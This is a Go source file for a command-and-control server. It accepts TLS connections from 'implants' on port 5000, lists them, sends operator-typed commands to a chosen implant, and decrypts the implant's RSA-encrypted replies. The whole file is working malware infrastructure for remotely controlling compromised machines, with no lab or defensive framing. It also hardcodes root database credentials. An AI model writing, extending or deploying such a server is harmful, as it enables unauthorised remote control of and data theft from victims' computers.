package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"github.com/peterh/liner"
	"net"
	"os"
	"strings"
	"sync"

	_ "github.com/go-sql-driver/mysql"
)

var implants = make(map[string]net.Conn)
var mutex sync.Mutex
var db *sql.DB
var privateKey *rsa.PrivateKey

func main() {
	loadPrivateKey()
	initDB()

	cert, err := tls.LoadX509KeyPair("certs/server.crt", "certs/server.key")
	if err != nil {
		panic(err)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", ":5000", config)
	if err != nil {
		panic(err)
	}
	defer ln.Close()

	fmt.Println("[+] C2 Server (TLS) running on port 5000...")
	go acceptConnections(ln)

	startCLI()
}

func loadPrivateKey() {
	keyData, err := os.ReadFile("certs/rsa_private.pem")
	if err != nil {
		panic(err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		panic("[-] Failed to decode RSA private key")
	}

	privateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		panic(err)
	}
}

func initDB() {
	var err error
	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2")
	if err != nil {
		panic(err)
	}
}

func acceptConnections(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		addr := conn.RemoteAddr().String()
		fmt.Println("[+] Implant connected:", addr)

		mutex.Lock()
		implants[addr] = conn
		mutex.Unlock()
	}
}

func startCLI() {
	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)
	line.SetCompleter(func(line string) []string {
		commands := []string{"list", "send", "exit"}
		var suggestions []string
		for _, cmd := range commands {
			if strings.HasPrefix(cmd, line) {
				suggestions = append(suggestions, cmd)
			}
		}
		return suggestions
	})

	for {
		input, err := line.Prompt("C2 > ")
		if err != nil {
			break
		}

		line.AppendHistory(input)
		input = strings.TrimSpace(input)

		switch {
		case input == "list":
			listImplants()
		case strings.HasPrefix(input, "send"):
			args := strings.SplitN(input, " ", 3)
			if len(args) < 3 {
				fmt.Println("Usage: send <IP> <command>")
				continue
			}
			sendCommand(args[1], args[2])
		case input == "exit":
			fmt.Println("[+] Exiting C2 Server...")
			return
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func listImplants() {
	mutex.Lock()
	defer mutex.Unlock()
	if len(implants) == 0 {
		fmt.Println("[-] No active implants")
		return
	}
	fmt.Println("[+] Active Implants:")
	for ip := range implants {
		fmt.Println("   -", ip)
	}
}

func sendCommand(ip, command string) {
	mutex.Lock()
	conn, exists := implants[ip]
	mutex.Unlock()

	if !exists {
		fmt.Println("[-] Implant not found")
		return
	}

	_, err := conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Println("[-] Failed to send command")
		mutex.Lock()
		delete(implants, ip)
		mutex.Unlock()
		return
	}

	reader := bufio.NewReader(conn)
	encResp, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("[-] Failed to read response")
		return
	}
	encResp = strings.TrimSpace(encResp)
	cipherData, err := base64.StdEncoding.DecodeString(encResp)
	if err != nil {
		fmt.Println("[-] Invalid response encoding")
		return
	}
	plain, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, cipherData, nil)
	if err != nil {
		fmt.Println("[-] Decryption failed")
		return
	}
	fmt.Printf("[+] Response from %s: %s\n", ip, string(plain))
}
